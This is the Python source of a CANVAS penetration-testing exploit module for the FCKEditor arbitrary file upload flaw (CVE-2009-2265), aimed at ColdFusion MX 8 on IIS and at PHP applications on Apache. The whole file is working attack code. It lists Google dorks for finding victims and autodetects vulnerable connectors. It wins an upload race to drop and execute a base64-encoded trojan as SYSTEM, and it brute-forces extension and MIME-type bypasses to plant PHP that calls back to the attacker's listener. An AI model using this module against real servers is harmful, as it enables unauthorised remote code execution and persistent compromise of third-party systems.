#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

import threading
import sys
import urllib2
import base64
import random
import time
import os
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen
import re

NAME="FCKEditor"
DESCRIPTION="FCKEditor arbitrary file upload vulnerability"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']        = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = ["http://www.adobe.com/support/security/bulletins/apsb09-09.html (ColdFusion)"]
DOCUMENTATION["CVE Name"]      = "CVE-2009-2265"
DOCUMENTATION["CVE URL"]       = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2265"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['Date public']='7/8/2009'
DOCUMENTATION['Google Dorks'] = ["inurl:cfm/cf5_connector.cfm", "inurl:cfm/cf5_upload.cfm","inurl:php/connector.php"]
DOCUMENTATION["Notes"]         = """This exploit has two different variants - one for Windows on ColdFusion and another for Apache.  The Default will get you a shell on ColdFusion MX 8.0 and MX 8.0.1.

ColdFusion/IIS:  To exploit this successfully you have to win a race condition - this exploit module dramatically increases your odds of getting a shell (in fact it doesn't stop until it does or you stop it).  Due to the nature of the exploit you may get more than 1 shell to appear (because we can win the race again before the module
has a chance to stop trying).  We first send a ColdFusion module up to the server that, when executed, will dump a MOSDEF trojan onto the webserver in the format of CFAdminYYZZ.exe.

This MOSDEF shell will be running as user SYSTEM.  The default behavior of this exploit is to attack ColdFusion on IIS.

Apache:  There are many applications that use FCKEditor and the attack vector varies as a result.  This module attempts a combination of many known attack vectors but can be 'noisy'

In the 'autoversion' mode it will attempt to find vulnerable installations of a few known applications that are known to be vulnerable.
In the 'custom' mode you can supply a path to your own connector believed to be vulnerable and CANVAS will attempt a variety of combinations
to get a shell uploaded and executed.  

Be mindful to supply the correct basepath so CANVAS can build the URLs correctly!

Due to the race condition the generated CFAdminYYZZ.cfm file may not be deleted from the /UserFiles/File folder.  You may have to do this manually"""
DOCUMENTATION["Known Vunlerable Versions"]=["ColdFusion MX 8 - 8.01","osCMax <=2.0","RunCMS <=1.3a","Falt4 CMS","Many more to come!"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

import urllib, time
from phplistener import get_php_stage1 #get our "Shellcode" 

NOTES="""
Tested on ColdFusion MX 8.0.1 on Windows
Tested on Apache/Linux
"""

CHANGELOG="""
"""

class createShell(threading.Thread):
    """
    We have a very short duration of time to call our ColdFusion file on the webserver
    before it is deleted.  If we win the race and call our file and it is executed our ColdFusion shell
    will be created on the webserver.
    """
    def __init__(self, ex_module):
        threading.Thread.__init__(self)
        ##we want access to spike user agent in case we had to do any basic auth
        self.module = ex_module
        ##we only stop trying once we get a shell or the user hits STOP
        self.SHELL_NOT_FOUND = True

    def run(self):
        tries = 0
        while True and self.SHELL_NOT_FOUND and tries < 500:
            tries += 1
            if self.module.state == self.module.HALT or self.module.succeeded:
                #exiting this function ...
                return 
            ##executes our first coldfusion file that will dump our shell to the webserver
            response = self.module.UA.GET(self.module.filelocation+self.module.filename, noresponse=True )
        return 

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.name               = NAME    
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = ""
        self.basepath           = ""
        self.connector          = "CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf5_connector.cfm"
        self.connector1         = "CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf5_connector.cfm"
        self.connector2         = "CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf5_upload.cfm"
        self.params             = "?Command=FileUpload&Type=File&CurrentFolder=%2f"
        self.trojanfile         = "svchost.exe"
        self.webserver          = ""
        self.phpfile            = "test.php"
        self.filelocation       = "UserFiles/File/" #the created files are always in the root under this directory

        return

    def get_random_trojan_name(self):
        #randomize the filename of the cfm too - sometime when we win the race it won't delete it! So you'll
        #have to clean this up manually!
        sample = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        name =  "CF8Admin%s%s"%("".join(random.sample(sample, 2)), str(random.randint(1,100) ))
        
        self.trojanfile = "%s.exe"%name
        self.filename   = "%s.cfm"%name
        
        return self.trojanfile
    
    def getargs(self):
        """
        Get arguments for attack
        """
        self.host               = self.target.interface
        self.getarg("hostname")
        if not self.hostname:
            self.hostname = self.host 
        self.getarg("port")
        self.connector          = self.argsDict.get("basepath", self.basepath)
        self.ssl                = self.argsDict.get("ssl",self.ssl)
        self.basicauth_user     = self.argsDict.get("username", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("password", self.basicauth_password)
        self.trojanfile         = self.get_random_trojan_name()
        
        
        ##php3 and php5 works on some sites that use blacklists against .php only
        self.allowed_exts = ["",".php",".php3",".php5"]
        
        self.allowed_exts += [ ".7z",".aiff",".asf",".avi",".bmp",".csv",".doc",".fla",".flv",".gif",".gz",".gzip",".jpeg",".jpg",".mid",".mov",".mp3",
                         ".mp4",".mpc",".mpeg",".mpg",".ods",".odt",".pdf",".png",".ppt",".pxd",".qt",".ram",".rar",".rm",".rmi",".rmvb",".rtf",
                         ".sdc",".sitd",".swf",".sxc",".sxw",".tar",".tgz",".tif",".tiff",".txt",".vsd",".wav",".wma",".wmv",".xls",".xml",".zip"]

        ##some of the web applications dont check file extension but only check the mime type which can be spoofed
        self.allowed_mime = ["text/html","application/zip","image/jpeg","text/plain","image/gif","application/xml",
                        "application/x-www-form-urlencoded"]
        
                    
        return 

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])
            
    def autoDetect(self):
        """
        Attempt to determine what vulnerable software is available to attack.  We can force a known response by POSTing
        to the connector file.  the function OnUploadComplete will always be in the response with a status code
        """
        self.log("AutoDetect selected")
        safe_file = "--576a5sdf6\r\n"
        safe_file += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"test.txt\"\r\n"
        safe_file += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
        safe_file += "test\r\n"
        safe_file += "--576a5sdf6--\r\n"
        
        ##self.connector is either a supplied folder in which the app is located
        ##or a path to a vulnerable connector
        self.basepath = self.connector
        
        targets = {}
        for index in self.versions.keys():
            name = self.versions[index][0]
            connectors = self.versions[index][1]
            targets[name]=connectors
            
        for target in targets.keys():
            if target == "ColdFusion MX 8 - 8.01":
                for conn in targets[target]:
                    self.log("Connector: %s"% conn)
                    connectto = self.basepath+conn+self.params
                    self.log("Connecting to: %s"%connectto)
                    response = self.UA.POST(connectto, safe_file )
                    self.log("Response: %s"% response)
                    if "OnUploadCompleted" in response:
                        self.log("Autodetect found ColdFusion connector!")
                        self.connector1     = self.basepath+self.connector1
                        self.connector2     = self.basepath+self.connector2
                        self.webserver      = "IIS"
                        self.version        = 2
                        return 1
                        
            else:
                self.log("Target: %s"% targets[target])
                response = self.UA.POST(self.basepath+targets[target]+self.params, safe_file, noresponse=False )
                self.log("Response: %s"% response)
                if "OnUploadCompleted" in response:
                    self.log("Auto versioning found a vulnerable connector for %s!"%target)
                    self.connector = self.basepath+targets[target]
                    self.webserver = "Apache"
                    self.version = 3 #all the same because they are all PHP
                    return 1
            
        self.log("No known vulnerable applications were found.  Consider using \"custom\" and supplying your own path to a connector")
        return None

    def setVersions(self):
        self.versions={}
        ##for known vulnerable apps we supply the winning combination of:
        ##Name, path to connector, file name, mime-type
        self.versions[0]=["Auto Detect","",""]
        self.versions[1]=["custom","",""]
        self.versions[2]=["ColdFusion MX 8 - 8.01",["CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf5_connector.cfm",
                                                    "CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/cf5_upload.cfm"],"",""]
        self.versions[3]=["osCMax <=2.0", "catalog/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php",["file.php3","file.php5"],"text/plain"]
        self.versions[4]=["RunCMS <=1.3a","editor/filemanager/browser/default/connectors/php/connector.php",[".php3",".php5"],""]
        self.versions[5]=["Falt4 CMS","modules/newsletter/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php",[".php",".php3",".php5"],"application/zip"]
        return 
            
    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.UNIVERSAL_MOSDEF]

    def test(self):
        """
        Quick check for known vulnerable connectors
        """ 
        self.setup_UA()
        self.log("Testing %s:%d for exploitability"%(self.host, self.port))
        return self.autoDetect()
        
    

    def make_CF_payload(self):
        """
        Build our ColdFusion 'shell' that will dump our MOSDEF trojan to disk and execute it
        """
        from libs.canvasos import canvasos 
        my_os = canvasos("Windows")
        my_os.arch = "x86"
        self.log("Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
        if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
            return False 
        
        base64data = base64.encodestring( self.mosdeftrojan )

        self.payload  = "--576a5sdf6\r\n"
        self.payload += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"%s\"\r\n"%self.filename
        self.payload += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
        self.payload += """
            <cfset path = GetDirectoryFromPath( GetCurrentTemplatePath() ) >
            <cfsavecontent variable="o">BASE64DATA</cfsavecontent>
            <cfset d = toBinary(o)>
            <cfset f = "TROJANFILENAME">
            <cffile
                action ="write"
                file="#path#/#f#"
                output=#d#>

            <cfexecute name = "cmd" arguments = '/c #path##f#' timeout = "10"></cfexecute>\r\n"""
        self.payload = self.payload.replace("BASE64DATA", base64data).replace("TROJANFILENAME",self.trojanfile)
        
        self.payload += "--576a5sdf6--\r\n"

        self.log("Created a payload using name: %s"%self.trojanfile)
        return self.payload


    def handle_ColdFusion_windows(self):
        """
        Attacking ColdFusion on Windows is a race condition that needs to be handled differently
        """
        ret = None
        payload = self.make_CF_payload()
        ##start our thread to constantly look for the file that will create our shell
        c = createShell(self)
        c.start()
        
        self.UA.addHeader("Content-Type", "multipart/form-data; boundary=576a5sdf6")
        tries = 0
        #we try a maximum of 200 times
        serverdied = 0
        while tries < 200:
            tries += 1
            
            if self.state==self.HALT:
                self.log("Module stopped by user")
                break
            
            ##we want to cover both possibilities in case one file was deleted during the patch 
            ##but the other one is left behind
           
            for connector in [self.connector1, self.connector2]:
                connectto = connector+self.params
                self.log("Connecting to: %s"%connectto)
                response=self.UA.POST(connectto, payload, noresponse=True)
                if response and "501 No Server There" in str(response):
                    serverdied +=1 
                    break 
                    
                time.sleep(0.3)
                #print response
                self.log("Response: %s"%response)
                
            if serverdied:
                self.log("Server is no longer there? Exiting loop.")
                break 

            if self.ISucceeded():
                self.log("Shell is on the server!")
                self.log("telling module to stop because our shell is executed")
                c.SHELL_NOT_FOUND = False
                self.setInfo("%s Succeeded!"%self.name)
                return 1
            else:
                self.log("No shell yet (try:%d)."%tries)

        if serverdied:
            self.log("Server seems to be not responding - we will wait 15 seconds for a shell just in case")
            #our server died, so we want to sleep for a bit, because in reality, it may just be
            #getting pounded by our other thread for a while.
            for i in xrange(0,15): #wait fifteen seconds to see if we get a shell
                time.sleep(1) 
                if self.ISucceeded():
                    c.SHELL_NOT_FOUND = False
                    return 1
            
        ##if we are here then we have pushed the STOP button and just want the other thread to stop
        c.SHELL_NOT_FOUND = False
        if self.ISucceeded():
            ret = 1
        return ret

    def handle_Apache(self):
        """
        Easier to exploit then on windows because there is no race to win.  Made this 'universal' to try to cover all 
        possible exploitation vectors. (some web applications don't check file exention but check the MIME type and others
        allow file.php.txt to be executed as php.  Others limit the type of file that can be uploaded.FCKeditor is used 
        in *so many* applications that this should cover a lot of ground with them all.  It's all kind of ugly but it works
        """
        ret = False
        
        filecontents = "<?php %s ?>"%self.get_php_to_mosdef()
        
        done = False
        for mime in self.allowed_mime:
            if done: 
                break
            for ext in self.allowed_exts:
                if self.ISucceeded():
                    done = True
                    ret  = True
                    break
                f = self.phpfile+ext
        
                payload  = "--576a5sdf6\r\n"
                payload += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"%s\"\r\n"%f
                #payload += "Content-Type: image/jpeg\r\n\r\n"
                payload += "Content-Type: %s\r\n\r\n"%mime
                payload += "%s\r\n"%filecontents
                payload += "--576a5sdf6--\r\n"
        
                self.UA.addHeader("Content-Type", "multipart/form-data; boundary=576a5sdf6")
                response=self.UA.POST(self.connector+self.params, payload, noresponse=False)
        
                ##if the POST is successful then we get the file name back.  It could have been 
                ##renamed so we parse it out of the response here
                if "(201,\"" in response:
                    ##we uploaded the file!  This is totally ugly but all apps use the same code base so we can get away with it.  don't judge me.
                    #print response
                    f = response.split("ed(201")[1].split("\"")[1]
                    print "uploaded",f
                elif "(202,\"" in response:
                    ##file was not uploaded so we don't want to waste our time trying to GET it
                    #continue
                    pass
                
                    
                #self.UA.clearHeaders()
                self.UA.addHeader("Connection", "keep-alive")
                response = self.UA.GET(self.filelocation+f, noresponse=True )

        return ret

    def setup_UA(self):

        self.getargs()
        
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user !="":
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None

        useragentstring=protocol+"://"+self.host+":%s"%self.port+"/"
        self.log("useragentstring: %s"%useragentstring)

        self.UA=spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
    
    def run(self):
        
        self.setup_UA()
        ret = False

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.hostname,self.port))

        self.log("Attacking %s:%d"%(self.hostname,self.port))
        #self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        self.log("using version: %s"%self.version)
        ##our attack varies depending on who and what we are targeting...
        if self.version == 0:
            self.autoDetect()
        elif self.version == 1:
            self.log("custom arguments supplied.  Attempting to attack connector:%s"%self.connector)
            #ret = self.handle_Apache()
            ret = self.handle_ColdFusion_windows()
            
        if self.webserver == "Apache":
            self.log("Attacking an Apache web server")
            ret = self.handle_Apache()
        elif self.webserver == "IIS":
            self.log("Attacking ColdFusion on IIS")
            ret = self.handle_ColdFusion_windows()


        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret
        
    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """

        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars="" #none for this one
        php_payload=get_php_stage1(badchars,localhost,localport,universal=self)

        return php_payload

    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

